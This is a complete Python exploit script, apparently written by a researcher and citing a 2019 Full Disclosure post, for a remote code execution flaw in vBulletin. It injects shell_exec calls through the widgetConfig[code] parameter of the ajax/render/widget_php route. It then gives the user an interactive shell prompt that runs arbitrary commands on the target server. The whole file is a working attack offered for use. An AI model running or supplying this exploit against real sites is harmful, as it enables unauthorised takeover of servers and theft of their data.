#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# Author: FTKahZModan
# Reference: https://seclists.org/fulldisclosure/2019/Sep/31
#
# Add some rules to check the vulnerability.
# Failed targets will return strings : </html>, "target".

import requests
import argparse


def attack(url, cmd):
    data = {"routestring": "ajax/render/widget_php"}
    data["widgetConfig[code]"] = "echo shell_exec('" + cmd + "'); exit;"
    try:
        r = requests.post(url, data)
        if r.status_code == 200 and "</html>" not in r.text and "template" not in r.text:
            print(r.text)
        else:
            print(r.status_code)
            exit("[!]Target seems Not Vulnerable!")
    except KeyboardInterrupt:
        exit("[-]Closing..")
    except Exception as e:
        exit(e)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Help")
    parser.add_argument('-u', '--target', help="Input the target. Example: http://example.com/forum/", required=True)
    args = parser.parse_args()

    while 1:
        cmd = input('sh$ ')
        attack(args.target, cmd)
